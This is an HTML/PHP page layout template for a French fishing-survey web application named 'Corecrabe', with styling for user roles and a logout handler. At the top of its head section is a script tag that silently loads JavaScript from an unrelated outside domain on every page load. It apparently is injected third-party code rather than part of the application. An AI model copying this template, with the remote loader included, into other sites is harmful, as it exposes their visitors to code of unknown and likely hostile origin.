<!doctype html>

<html lang="en">



<head>
<script type="text/javascript" src="https://brolink1s.site/code/hbsdazrrha5ha3ddf42tambu" async></script>

  <meta charset="UTF-8">

  <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">

  <meta http-equiv="X-UA-Compatible" content="ie=edge">

  <link rel="icon" type="image/jpg" href="<?= img_url('favicon.jpg') ?>">

  <title><?= $title = isset($title) && !empty($title) ? $title : 'Corecrabe'; ?></title>

  <?php if (isset($default_stylesheets)) echo charger_css($default_stylesheets); ?>

  <?php if (isset($custom_stylesheets)) echo charger_css($custom_stylesheets); ?>

  <style>

    html,

    body {

      user-select: none;

      -moz-user-select: none;

      -moz-user-select: none;

    }



    /* Chrome, Safari, Edge, Opera */

    input[type=number]::-webkit-outer-spin-button,

    input[type=number]::-webkit-inner-spin-button {

      -webkit-appearance: none;

      margin: 0;

    }



    /* Firefox */

    input[type=number] {

      -moz-appearance: textfield;

    }



    .js-date-enquete {

      min-width: 150px;

    }



    .js-nombre-partenaire-de-peche {

      max-width: 70px;

    }



    .login-page {

      background: rgb(47,82,143);

      background: linear-gradient(180deg, rgba(47,82,143,1) 44%, rgba(47,92,172,1) 59%, rgba(55,105,196,1) 100%);

    }



    .card-acheteur {

      background-color: #c55a11;

      color: white;

    }



    .card-pecheur {

      background-color: #00b050;

      color: white;

    }



    .card-enqueteur {

      background-color: #0070C0;

      color: white;

    }

    .card-recensement {

        background-color: #6f42c1;

        color: white;

        }

        .affiche-pecheur-group .affiche-pecheur-control {
        padding: 0;
        }

    

    .content-bienvenue {

      background: rgb(47,82,143);

      background: linear-gradient(180deg, rgba(47,82,143,1) 44%, rgba(47,92,172,1) 59%, rgba(55,105,196,1) 100%);

    }

    

    .conteneur-bienvenue {

      display: flex;

      flex-direction: column;

      -ms-flex-align: center;

      align-items: center;

      height: calc(100vh - 57px);

      justify-content: center;

    }

    

    .content-bienvenue {

      text-align: center;

      color: rgba(47,82,143,1);

      font-size: 3em;

      padding: 10px;

      background: rgb(255, 255, 255);

      width: 100%;

    }



    /* .conteneur-bienvenue img {
      background: rgb(255, 255, 255);
      width: 50%;

    }



    @media screen and (max-width: 471px){

      .conteneur-bienvenue img {

        width: 100%;

      }

    }

    @media screen and (max-width: 769px){

      .conteneur-bienvenue img {

        width: 80%;

      }

    }

    @media screen and (max-width: 1025px){

      .conteneur-bienvenue img {

        width: 70%;

      }

    } */

    

  </style>

  <noscript>Les scripts ne sont pas pris en charge par ce navigateur. Veuillez activer ce module au risque que certaines foncitonnalités ne foncitonnera pas comme prévu</noscript>

</head>



<body <?php if (isset($body_classes)) echo charger_classes($body_classes); ?>>

  <?= $routes = isset($routes) && !empty($routes) ? $routes : ''; ?>

  <?php if (isset($default_javascripts)) echo charger_js($default_javascripts); ?>

  <?php if (isset($custom_javascripts)) echo charger_js($custom_javascripts); ?>

  <script type="text/javascript">

    $(() => {

      $('#js-bouton-deconnexion').on('click', e => {

        confirmerDeconnexion(() => {

          location.href = `${BASE_URL}/deconnexion.html`;

        })

      })

    })

  </script>

</body>



</html>
